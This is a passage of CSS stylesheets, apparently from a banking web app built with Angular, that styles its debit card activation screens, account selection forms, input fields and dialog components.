    .products-detail-footer[_ngcontent-qmv-c251] .icon[_ngcontent-qmv-c251] {
      font-size: 20px;
      color: #0048db;
      margin-left: 0;
      cursor: pointer
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251],
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] {
      justify-content: center;
      align-items: center;
      background-color: #fff;
      padding: 0
    }

    @media (min-width: 992px) {

      .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251],
      .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] {
        display: flex;
        background-color: transparent
      }
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] a[_ngcontent-qmv-c251],
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] a[_ngcontent-qmv-c251] {
      display: flex;
      cursor: pointer;
      align-items: center;
      text-decoration: underline
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] a[_ngcontent-qmv-c251] .icon[_ngcontent-qmv-c251],
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] a[_ngcontent-qmv-c251] .icon[_ngcontent-qmv-c251] {
      position: relative;
      top: -1px;
      font-size: 16px;
      margin-right: 8px
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] a[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251],
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] a[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      color: #0048db
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] a.disabled[_ngcontent-qmv-c251],
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] a.disabled[_ngcontent-qmv-c251] {
      color: #9da6af;
      cursor: not-allowed;
      pointer-events: none
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] a.disabled[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251],
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] a.disabled[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      color: #9da6af
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] div.loader-call-credits[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251],
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] div.loader-call-credits[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      position: relative;
      padding-left: 24px;
      font-size: 12px;
      line-height: 16px;
      font-weight: 400;
      color: #5c6b7a
    }

    .products-detail-footer.digital-debit-card-footer[_ngcontent-qmv-c251] div.loader-call-credits[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251]:before,
    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] div.loader-call-credits[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251]:before {
      content: "";
      font-size: 12px;
      width: 20px;
      height: 20px;
      border-width: 2px;
      position: absolute;
      left: -1px;
      bottom: 1px;
      color: #0048db
    }

    .products-detail-footer.alert-zero-credit-cards-footer[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      font-size: 12px;
      line-height: 1.33;
      font-weight: 700;
      color: #2c2c33
    }

    @media (min-width: 768px) and (max-width: 991.98px) {
      .products-detail-body[_ngcontent-qmv-c251] .info[_ngcontent-qmv-c251] h5[_ngcontent-qmv-c251] {
        font-size: 16px
      }
    }

    .products-detail[_ngcontent-qmv-c251] .section[_ngcontent-qmv-c251] {
      display: flex;
      flex-direction: column;
      justify-content: space-between
    }

    .products-detail[_ngcontent-qmv-c251] .md[_ngcontent-qmv-c251] {
      width: 85px !important;
      height: 25px !important;
      margin-top: 12px
    }

    .products-detail[_ngcontent-qmv-c251] .date-section[_ngcontent-qmv-c251] {
      display: flex;
      justify-content: space-between;
      align-items: center;
      align-content: center;
      margin-bottom: 10px
    }

    .products-detail[_ngcontent-qmv-c251] .date-section[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251] {
      margin-bottom: 0;
      margin-right: 4px
    }

    .products-detail[_ngcontent-qmv-c251] .date-section[_ngcontent-qmv-c251] p[_ngcontent-qmv-c251]:last-child {
      margin-right: 0
    }

    .products-detail[_ngcontent-qmv-c251] .date-section[_ngcontent-qmv-c251] .icon-calendario[_ngcontent-qmv-c251] {
      color: #cb3a29;
      font-size: 18px;
      margin-right: 4px
    }

    .products-detail[_ngcontent-qmv-c251] .date-section[_ngcontent-qmv-c251] .icon-calendario.blue[_ngcontent-qmv-c251] {
      color: #0014a2
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c224_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c224_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .digital-debit-card-container-line[_ngcontent-qmv-c224] {
      width: 100%;
      height: 8px;
      background-image: linear-gradient(269deg, #E1001D 100%, #A00104 2%)
    }

    .digital-debit-card-container-space[_ngcontent-qmv-c224] {
      width: 100%;
      height: 24px
    }

    .digital-debit-card-container-navbar[_ngcontent-qmv-c224] {
      display: flex;
      justify-content: space-between;
      padding: 0 15px;
      margin-top: 20px;
      margin-bottom: 20px
    }

    .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224] {
      display: flex
    }

    .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224] .title[_ngcontent-qmv-c224],
    .digital-debit-card-container-navbar-title[_ngcontent-qmv-c224] {
      display: none
    }

    .digital-debit-card-container-navbar-info[_ngcontent-qmv-c224] {
      display: flex;
      justify-content: space-around;
      align-items: center
    }

    .digital-debit-card-container-navbar-info[_ngcontent-qmv-c224] h5[_ngcontent-qmv-c224] {
      margin-left: 12px;
      margin-bottom: 0;
      line-height: 1.6
    }

    @media (max-width: 360px) {
      .digital-debit-card-container-navbar-info[_ngcontent-qmv-c224] h5[_ngcontent-qmv-c224] {
        width: 230px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap
      }
    }

    .digital-debit-card-container-navbar-info[_ngcontent-qmv-c224] .icon[_ngcontent-qmv-c224] {
      font-size: 24px;
      cursor: pointer
    }

    .digital-debit-card-container-navbar-cancel[_ngcontent-qmv-c224] {
      display: flex
    }

    .digital-debit-card-container-navbar-cancel[_ngcontent-qmv-c224] .icon[_ngcontent-qmv-c224] {
      font-size: 24px;
      cursor: pointer
    }

    @media (min-width: 768px) {
      .digital-debit-card-container-navbar[_ngcontent-qmv-c224] {
        padding: 0;
        margin: 12px 67px
      }

      .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224] {
        display: flex;
        justify-content: space-between;
        max-width: 100px;
        cursor: pointer
      }

      .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224]:hover {
        color: #0048db
      }

      .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224]:hover>.icon[_ngcontent-qmv-c224] {
        background-color: #f1f3f6;
        border-radius: 50%
      }

      .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224]:hover>.title[_ngcontent-qmv-c224] {
        color: #0048db
      }

      .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224] .title[_ngcontent-qmv-c224] {
        display: flex;
        font-size: 14px;
        line-height: 1.71;
        color: #414a53;
        margin: 2px 5px
      }

      .digital-debit-card-container-navbar-info[_ngcontent-qmv-c224],
      .digital-debit-card-container-navbar-links[_ngcontent-qmv-c224] .title[_ngcontent-qmv-c224],
      .digital-debit-card-container-navbar-cancel[_ngcontent-qmv-c224] {
        color: #838f9a
      }
    }

    .digital-debit-card-container-message[_ngcontent-qmv-c224] {
      max-width: 100%;
      margin: 2rem;
      text-align: center
    }

    .digital-debit-card-container-stepper[_ngcontent-qmv-c224] {
      max-width: 100%;
      margin: 2rem 1.5rem
    }

    .digital-debit-card-container-content[_ngcontent-qmv-c224] {
      max-width: 100%;
      margin: 2rem 1rem 1rem
    }

    @media (min-width: 768px) {
      .digital-debit-card-container-line[_ngcontent-qmv-c224] {
        display: none
      }

      .digital-debit-card-container-stepper[_ngcontent-qmv-c224] {
        max-width: 400px;
        margin: 0 auto
      }

      .digital-debit-card-container-content[_ngcontent-qmv-c224] {
        max-width: 400px;
        margin: 2rem auto 0
      }
    }

    .digital-debit-card-container-content[_ngcontent-qmv-c224] {
      max-width: 400px;
      width: 100%;
      margin: 2rem auto 0;
      padding: 0 1rem
    }

    @media (min-width: 768px) {
      .digital-debit-card-container[_ngcontent-qmv-c224] {
        display: flex;
        flex-direction: column;
        margin-top: 0
      }

      .digital-debit-card-container-line[_ngcontent-qmv-c224] {
        display: none
      }

      .digital-debit-card-container-navbar[_ngcontent-qmv-c224] {
        margin-bottom: 10px
      }

      .digital-debit-card-container-content[_ngcontent-qmv-c224] {
        margin-top: 0;
        padding: 0;
        max-width: 100%
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c221_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c221_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .landing[_ngcontent-qmv-c221] {
      margin: 0 auto
    }

    .landing__title[_ngcontent-qmv-c221] h1[_ngcontent-qmv-c221] {
      font-size: 20px;
      line-height: 1.6;
      font-weight: 600;
      color: #2c2c33;
      padding: 0 10px;
      text-align: center;
      margin-bottom: 32px
    }

    @media (min-width: 768px) {
      .landing__title[_ngcontent-qmv-c221] h1[_ngcontent-qmv-c221] {
        margin-bottom: 56px
      }
    }

    .landing__information[_ngcontent-qmv-c221] {
      display: flex;
      flex-direction: column;
      justify-content: center
    }

    @media (min-width: 768px) {
      .landing__information[_ngcontent-qmv-c221] {
        flex-direction: row;
        justify-content: space-between;
        max-width: 720px;
        margin: 0 auto
      }
    }

    .landing__description[_ngcontent-qmv-c221] {
      flex: 1
    }

    @media (min-width: 768px) {
      .landing__description[_ngcontent-qmv-c221] {
        margin-right: 2rem
      }
    }

    .landing__description[_ngcontent-qmv-c221] img[_ngcontent-qmv-c221] {
      display: block;
      margin: 0 auto;
      width: 213px;
      height: 136px
    }

    .landing__description--text[_ngcontent-qmv-c221] {
      font-size: 15px;
      line-height: 1.5;
      font-weight: 600;
      color: #2c2c33;
      margin: 12px auto 32px;
      text-align: center
    }

    @media (min-width: 768px) {
      .landing__description--text[_ngcontent-qmv-c221] {
        font-size: 18px;
        line-height: 1.78;
        font-weight: 400;
        color: #2c2c33
      }
    }

    .landing__list[_ngcontent-qmv-c221] {
      position: relative;
      margin-bottom: 1rem;
      flex: 1
    }

    .landing__list--item[_ngcontent-qmv-c221] {
      display: flex;
      justify-content: flex-start;
      align-items: flex-start;
      margin-bottom: 5px
    }

    .landing__list--item[_ngcontent-qmv-c221] img[_ngcontent-qmv-c221] {
      margin-right: 10px
    }

    .landing__list--item[_ngcontent-qmv-c221] p[_ngcontent-qmv-c221] {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 400;
      color: #2c2c33;
      margin-bottom: 0
    }

    .landing__footer[_ngcontent-qmv-c221] .btn-activate-card[_ngcontent-qmv-c221] {
      display: block;
      max-width: 100%;
      margin: 0 auto
    }

    @media (min-width: 768px) {
      .landing__footer[_ngcontent-qmv-c221] {
        max-width: 400px;
        margin: 0 auto
      }

      .landing__footer[_ngcontent-qmv-c221] .btn-activate-card[_ngcontent-qmv-c221] {
        max-width: 290px
      }
    }

    .landing__footer--link[_ngcontent-qmv-c221] {
      margin: 0 auto 24px;
      justify-content: center;
      align-content: center;
      display: flex;
      cursor: pointer;
      align-items: center;
      width: auto
    }

    .landing__footer--link[_ngcontent-qmv-c221] span.icon[_ngcontent-qmv-c221] {
      font-size: 16px;
      color: #0048db
    }

    .landing__footer--link[_ngcontent-qmv-c221] h6[_ngcontent-qmv-c221] {
      font-size: 12px;
      line-height: 2;
      font-weight: 600;
      color: #0048db;
      margin: 0 0 0 8px
    }

    .landing__footer--link[_ngcontent-qmv-c221] h6[_ngcontent-qmv-c221] {
      text-decoration: underline !important
    }

    @media (min-width: 768px) {
      .landing__footer--link[_ngcontent-qmv-c221] h6[_ngcontent-qmv-c221] {
        font-size: 14px;
        line-height: 1.71;
        font-weight: 600;
        color: #0048db
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c220_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c220_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .benefits__item[_ngcontent-qmv-c220] {
      display: flex;
      justify-content: flex-start;
      align-items: flex-start;
      margin-bottom: 5px
    }

    .benefits__item[_ngcontent-qmv-c220] img[_ngcontent-qmv-c220] {
      margin-right: 10px
    }

    .benefits__item[_ngcontent-qmv-c220] p[_ngcontent-qmv-c220] {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 400;
      color: #2c2c33;
      margin-bottom: 0
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c214_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c214_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .activate[_ngcontent-qmv-c214] {
      margin: 0 auto;
      position: relative;
      min-height: calc(100vh - 200px)
    }

    @media (min-width: 768px) {
      .activate[_ngcontent-qmv-c214] {
        max-width: 400px
      }
    }

    .activate__accounts--title[_ngcontent-qmv-c214] {
      text-align: center;
      margin-bottom: 1.5rem;
      line-height: 1.5
    }

    .activate__accounts--loading[_ngcontent-qmv-c214] {
      max-width: 100%;
      padding: 1rem
    }

    .activate__accounts--loading[_ngcontent-qmv-c214] .card-loader-item[_ngcontent-qmv-c214] {
      height: 50px;
      width: 100%;
      max-width: 400px;
      display: block;
      margin: 3% auto 0
    }

    .activate__accounts--not-found[_ngcontent-qmv-c214] {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 40px 0;
      max-width: 100%
    }

    .activate__accounts--not-found[_ngcontent-qmv-c214] img[_ngcontent-qmv-c214],
    .activate__accounts--not-found[_ngcontent-qmv-c214] h6[_ngcontent-qmv-c214] {
      text-align: center
    }

    .activate__accounts--not-found[_ngcontent-qmv-c214] img[_ngcontent-qmv-c214] {
      width: 100px;
      height: 100px
    }

    .activate__accounts--not-found[_ngcontent-qmv-c214] .bg-credit-origin[_ngcontent-qmv-c214] {
      margin-bottom: 30px
    }

    .activate__accounts--not-found[_ngcontent-qmv-c214] .btn-close[_ngcontent-qmv-c214] {
      cursor: pointer;
      color: #0014a2;
      font-size: 14px;
      font-weight: 600;
      line-height: 1.57
    }

    .activate__accounts--not-found[_ngcontent-qmv-c214] .description[_ngcontent-qmv-c214] {
      text-align: center;
      color: #414a53;
      line-height: 1.71;
      font-size: 14px;
      font-weight: 400
    }

    .activate__accounts--form[_ngcontent-qmv-c214] {
      width: 100%;
      margin-top: 10px
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .btn[_ngcontent-qmv-c214] {
      margin-top: 32px
    }

    .activate__accounts--form--input[_ngcontent-qmv-c214] {
      display: flex;
      flex-direction: column;
      margin-bottom: 0;
      margin-top: 24px
    }

    .activate__accounts--form--input[_ngcontent-qmv-c214] h6[_ngcontent-qmv-c214] {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 400;
      color: #2c2c33;
      margin-bottom: 0
    }

    .activate__accounts--form--input[_ngcontent-qmv-c214] p[_ngcontent-qmv-c214] {
      margin: 6px 0;
      font-size: 12px;
      line-height: 1.33;
      font-weight: 400;
      color: #2c2c33;
      color: #5c6b7a
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box.disabled[_ngcontent-qmv-c214] {
      cursor: not-allowed;
      background-color: #f1f3f6
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box.selected[_ngcontent-qmv-c214] {
      border: solid 2px #0048DB;
      background-color: #f1f2ff
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214] {
      cursor: pointer;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      max-height: 60px;
      margin-bottom: 1rem;
      padding: 8px 0 8px 16px;
      border: solid 2px transparent;
      border-radius: 5px;
      position: relative;
      background-color: #fff;
      justify-content: center;
      box-shadow: 0 2px 4px #414a534d
    }

    @media (min-width: 576px) {
      .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214] {
        padding: 8px 0 8px 20px
      }
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214]>*[_ngcontent-qmv-c214] {
      margin: 0
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214] .content[_ngcontent-qmv-c214] {
      font-size: 12px;
      line-height: 1.71;
      display: flex;
      flex-direction: column;
      margin-left: 1.5rem;
      max-width: 220px
    }

    @media (min-width: 576px) {
      .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214] .content[_ngcontent-qmv-c214] {
        font-size: 14px;
        max-width: 300px
      }
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214] .content-balance[_ngcontent-qmv-c214] {
      color: #77899a
    }

    .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214] .icon-retiro[_ngcontent-qmv-c214] {
      color: #414a53;
      left: 16px;
      top: 16px;
      font-size: 20px
    }

    @media (min-width: 576px) {
      .activate__accounts--form[_ngcontent-qmv-c214] .avv-contact-box[_ngcontent-qmv-c214] .icon-retiro[_ngcontent-qmv-c214] {
        font-size: 24px
      }
    }
  </style>
  <style>
    .form-input {
      position: relative;
      padding-top: 10px
    }

    .form-input label {
      position: relative;
      margin: auto;
      width: 100%;
      -webkit-user-select: none;
      user-select: none
    }

    .form-input label .label {
      position: absolute;
      top: 8px;
      left: 0;
      font-size: 16px;
      color: #77899a;
      transform-origin: 0 0;
      transition: all .2s ease
    }

    .form-input label .label>span {
      margin-right: 8px
    }

    .form-input label .form-border {
      position: absolute;
      bottom: 0;
      left: 0;
      height: 2px;
      width: 100%;
      background: #0048DB;
      transform: scaleX(0);
      transform-origin: 0 0;
      transition: all .15s ease
    }

    .form-input label .form-icon {
      position: absolute;
      left: 0;
      top: 10px;
      font-size: 20px;
      opacity: 0;
      visibility: hidden;
      transition: .15s
    }

    .form-input label input[type=number]::-webkit-outer-spin-button,
    .form-input label input[type=number]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0
    }

    .form-input label input[type=number] {
      -moz-appearance: textfield
    }

    .form-input label input {
      -webkit-appearance: none;
      width: 100%;
      border: 0;
      font-family: inherit;
      padding: 10px 0 6px;
      font-size: 14px;
      font-weight: 500;
      border-bottom: 1px solid #77899A;
      background: none;
      border-radius: 0;
      color: #283747;
      transition: all .15s ease
    }

    .form-input label input:disabled {
      background-color: #f1f3f6
    }

    .form-input label input.ng-touched.ng-invalid {
      border-bottom: 1px solid #A00104
    }

    .form-input label input.ng-touched.ng-invalid+span {
      color: #a00104;
      transform: translateY(-20px) scale(.75)
    }

    .form-input label input.ng-touched.ng-invalid+span+.form-border {
      transform: scaleX(1);
      background: #A00104
    }

    .form-input label input.ng-touched.ng-invalid+span+.form-border+.form-icon {
      color: #a00104;
      opacity: 1;
      visibility: visible
    }

    .form-input label input:focus {
      box-shadow: none;
      outline: inherit
    }

    .form-input label input:hover:not(:disabled):not(.disabled) {
      background: rgba(34, 50, 84, .03)
    }

    .form-input label input:not(:placeholder-shown)+span {
      color: #0048db;
      transform: translateY(-20px) scale(.75)
    }

    .form-input label input:not(:placeholder-shown)+span+.form-border+.form-icon {
      opacity: 1;
      visibility: visible
    }

    .form-input label input:focus {
      background: none;
      outline: none
    }

    .form-input label input:focus+span {
      color: #0048db;
      transform: translateY(-20px) scale(.75)
    }

    .form-input label input:focus+span+.form-border {
      transform: scaleX(1)
    }

    .form-input label input:focus+span+.form-border+.form-icon {
      opacity: 1;
      visibility: visible
    }

    .form-input.icon label input {
      padding-left: 26px
    }

    .form-input.keep-icon label .label {
      padding-left: 30px
    }

    .form-input.keep-icon label .form-icon {
      visibility: visible;
      opacity: 1
    }

    .form-input.keep-icon label input {
      padding-left: 26px
    }

    .form-input.keep-icon label input:not(:placeholder-shown)+span {
      padding-left: 0
    }

    .form-input.keep-icon label input:focus+span {
      padding-left: 0
    }
  </style>
  <style>
    .form-input label input {
      transition: all .15s ease, padding-left 0s
    }

    .form-input label .currency-icon {
      position: absolute;
      top: 10px;
      left: 0
    }

    .form-input label.not-empty input {
      padding-left: 13px
    }
  </style>
  <style>
    .validation-message[_ngcontent-qmv-c31] {
      font-size: 12px;
      color: #a00104
    }

    .form-input-transfer[_nghost-qmv-c31] .validation-message[_ngcontent-qmv-c31],
    .form-input-transfer [_nghost-qmv-c31] .validation-message[_ngcontent-qmv-c31] {
      margin-top: 8px
    }
  </style>
  <style>
    .mdc-elevation-overlay {
      position: absolute;
      border-radius: inherit;
      pointer-events: none;
      opacity: var(--mdc-elevation-overlay-opacity, 0);
      transition: opacity 280ms cubic-bezier(0.4, 0, 0.2, 1)
    }

    .mdc-dialog,
    .mdc-dialog__scrim {
      position: fixed;
      top: 0;
      left: 0;
      align-items: center;
      justify-content: center;
      box-sizing: border-box;
      width: 100%;
      height: 100%
    }

    .mdc-dialog {
      display: none;
      z-index: var(--mdc-dialog-z-index, 7)
    }

    .mdc-dialog .mdc-dialog__content {
      padding: 20px 24px 20px 24px
    }

    .mdc-dialog .mdc-dialog__surface {
      min-width: 280px
    }

    @media(max-width: 592px) {
      .mdc-dialog .mdc-dialog__surface {
        max-width: calc(100vw - 32px)
      }
    }

    @media(min-width: 592px) {
      .mdc-dialog .mdc-dialog__surface {
        max-width: 560px
      }
    }

    .mdc-dialog .mdc-dialog__surface {
      max-height: calc(100% - 32px)
    }

    .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
      max-width: none
    }

    @media(max-width: 960px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        max-height: 560px;
        width: 560px
      }

      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
        right: -12px
      }
    }

    @media(max-width: 720px)and (max-width: 672px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        width: calc(100vw - 112px)
      }
    }

    @media(max-width: 720px)and (min-width: 672px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        width: 560px
      }
    }

    @media(max-width: 720px)and (max-height: 720px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        max-height: calc(100vh - 160px)
      }
    }

    @media(max-width: 720px)and (min-height: 720px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        max-height: 560px
      }
    }

    @media(max-width: 720px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
        right: -12px
      }
    }

    @media(max-width: 720px)and (max-height: 400px), (max-width: 600px), (min-width: 720px)and (max-height: 400px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        height: 100%;
        max-height: 100vh;
        max-width: 100vw;
        width: 100vw;
        border-radius: 0
      }

      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
        order: -1;
        left: -12px
      }

      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__header {
        padding: 0 16px 9px;
        justify-content: flex-start
      }

      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__title {
        margin-left: calc(16px - 2 * 12px)
      }
    }

    @media(min-width: 960px) {
      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        width: calc(100vw - 400px)
      }

      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
        right: -12px
      }
    }

    .mdc-dialog.mdc-dialog__scrim--hidden .mdc-dialog__scrim {
      opacity: 0
    }

    .mdc-dialog__scrim {
      opacity: 0;
      z-index: -1
    }

    .mdc-dialog__container {
      display: flex;
      flex-direction: row;
      align-items: center;
      justify-content: space-around;
      box-sizing: border-box;
      height: 100%;
      transform: scale(0.8);
      opacity: 0;
      pointer-events: none
    }

    .mdc-dialog__surface {
      position: relative;
      display: flex;
      flex-direction: column;
      flex-grow: 0;
      flex-shrink: 0;
      box-sizing: border-box;
      max-width: 100%;
      max-height: 100%;
      pointer-events: auto;
      overflow-y: auto
    }

    .mdc-dialog__surface .mdc-elevation-overlay {
      width: 100%;
      height: 100%;
      top: 0;
      left: 0
    }

    [dir=rtl] .mdc-dialog__surface,
    .mdc-dialog__surface[dir=rtl] {
      text-align: right
    }

    @media screen and (forced-colors: active),
    (-ms-high-contrast: active) {
      .mdc-dialog__surface {
        outline: 2px solid windowText
      }
    }

    .mdc-dialog__surface::before {
      position: absolute;
      box-sizing: border-box;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      border: 2px solid rgba(0, 0, 0, 0);
      border-radius: inherit;
      content: "";
      pointer-events: none
    }

    @media screen and (forced-colors: active) {
      .mdc-dialog__surface::before {
        border-color: CanvasText
      }
    }

    @media screen and (-ms-high-contrast: active),
    screen and (-ms-high-contrast: none) {
      .mdc-dialog__surface::before {
        content: none
      }
    }

    .mdc-dialog__title {
      display: block;
      margin-top: 0;
      position: relative;
      flex-shrink: 0;
      box-sizing: border-box;
      margin: 0 0 1px;
      padding: 0 24px 9px
    }

    .mdc-dialog__title::before {
      display: inline-block;
      width: 0;
      height: 40px;
      content: "";
      vertical-align: 0
    }

    [dir=rtl] .mdc-dialog__title,
    .mdc-dialog__title[dir=rtl] {
      text-align: right
    }

    .mdc-dialog--scrollable .mdc-dialog__title {
      margin-bottom: 1px;
      padding-bottom: 15px
    }

    .mdc-dialog--fullscreen .mdc-dialog__header {
      align-items: baseline;
      border-bottom: 1px solid rgba(0, 0, 0, 0);
      display: inline-flex;
      justify-content: space-between;
      padding: 0 24px 9px;
      z-index: 1
    }

    @media screen and (forced-colors: active) {
      .mdc-dialog--fullscreen .mdc-dialog__header {
        border-bottom-color: CanvasText
      }
    }

    .mdc-dialog--fullscreen .mdc-dialog__header .mdc-dialog__close {
      right: -12px
    }

    .mdc-dialog--fullscreen .mdc-dialog__title {
      margin-bottom: 0;
      padding: 0;
      border-bottom: 0
    }

    .mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__title {
      border-bottom: 0;
      margin-bottom: 0
    }

    .mdc-dialog--fullscreen .mdc-dialog__close {
      top: 5px
    }

    .mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__actions {
      border-top: 1px solid rgba(0, 0, 0, 0)
    }

    @media screen and (forced-colors: active) {
      .mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__actions {
        border-top-color: CanvasText
      }
    }

    .mdc-dialog--fullscreen--titleless .mdc-dialog__close {
      margin-top: 4px
    }

    .mdc-dialog--fullscreen--titleless.mdc-dialog--scrollable .mdc-dialog__close {
      margin-top: 0
    }

    .mdc-dialog__content {
      flex-grow: 1;
      box-sizing: border-box;
      margin: 0;
      overflow: auto
    }

    .mdc-dialog__content>:first-child {
      margin-top: 0
    }

    .mdc-dialog__content>:last-child {
      margin-bottom: 0
    }

    .mdc-dialog__title+.mdc-dialog__content,
    .mdc-dialog__header+.mdc-dialog__content {
      padding-top: 0
    }

    .mdc-dialog--scrollable .mdc-dialog__title+.mdc-dialog__content {
      padding-top: 8px;
      padding-bottom: 8px
    }

    .mdc-dialog__content .mdc-deprecated-list:first-child:last-child {
      padding: 6px 0 0
    }

    .mdc-dialog--scrollable .mdc-dialog__content .mdc-deprecated-list:first-child:last-child {
      padding: 0
    }

    .mdc-dialog__actions {
      display: flex;
      position: relative;
      flex-shrink: 0;
      flex-wrap: wrap;
      align-items: center;
      justify-content: flex-end;
      box-sizing: border-box;
      min-height: 52px;
      margin: 0;
      padding: 8px;
      border-top: 1px solid rgba(0, 0, 0, 0)
    }

    @media screen and (forced-colors: active) {
      .mdc-dialog__actions {
        border-top-color: CanvasText
      }
    }

    .mdc-dialog--stacked .mdc-dialog__actions {
      flex-direction: column;
      align-items: flex-end
    }

    .mdc-dialog__button {
      margin-left: 8px;
      margin-right: 0;
      max-width: 100%;
      text-align: right
    }

    [dir=rtl] .mdc-dialog__button,
    .mdc-dialog__button[dir=rtl] {
      margin-left: 0;
      margin-right: 8px
    }

    .mdc-dialog__button:first-child {
      margin-left: 0;
      margin-right: 0
    }

    [dir=rtl] .mdc-dialog__button:first-child,
    .mdc-dialog__button:first-child[dir=rtl] {
      margin-left: 0;
      margin-right: 0
    }

    [dir=rtl] .mdc-dialog__button,
    .mdc-dialog__button[dir=rtl] {
      text-align: left
    }

    .mdc-dialog--stacked .mdc-dialog__button:not(:first-child) {
      margin-top: 12px
    }

    .mdc-dialog--open,
    .mdc-dialog--opening,
    .mdc-dialog--closing {
      display: flex
    }

    .mdc-dialog--opening .mdc-dialog__scrim {
      transition: opacity 150ms linear
    }

    .mdc-dialog--opening .mdc-dialog__container {
